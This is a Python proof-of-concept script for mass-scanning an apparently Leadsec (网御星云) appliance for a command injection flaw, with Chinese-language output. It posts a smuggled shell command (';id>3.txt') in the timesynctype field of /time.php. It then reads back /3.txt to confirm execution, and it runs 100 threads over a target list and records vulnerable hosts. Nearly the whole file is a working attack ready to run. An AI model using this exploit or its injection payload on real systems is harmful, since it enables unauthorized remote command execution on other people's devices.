import requests, re, os, sys, argparse
from multiprocessing.dummy import Pool

from urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)


def main():
    url_list = []
    parse = argparse.ArgumentParser(description="这是一个关于网御星云的扫描脚本")
    parse.add_argument("-u", "--url", dest="url", type=str, help="Please enter your url")
    parse.add_argument("-f", "--file", dest="file", type=str, help="Please enter your file")

    args = parse.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        with open(args.file, 'r', encoding='utf-8') as f:
            for url in f.readlines():
                url_list.append(url.strip().replace('\n', ''))
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")


def poc(target):
    payload = '/time.php'
    payload1 = '/3.txt'
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0'
    }
    data = {'timesynctype':';''id>3.txt'}
    proxy = {
        'http': 'http://127.0.0.1:8080',
        'https': 'http://127.0.0.1:8080'
    }
    try:
        res1 = requests.post(url=target + payload, data=data, headers=headers, verify=False, proxies=proxy, timeout=5)
        if res1.status_code == 200:
            res2 = requests.get(url=target + payload1, headers=headers, verify=False, proxies=proxy, timeout=5)
            if res2.status_code == 200 and 'uid' in res2.text:
                print(f"[+]{target}存在漏洞")
                with open('time.txt', 'a', encoding='utf-8') as f:
                    f.write(target + '\n')
        else:
            print(f"[-]{target}不存在漏洞")
    except Exception as e:
        print(f"[E]{target}请求异常: {str(e)}")


if __name__ == '__main__':
    main()
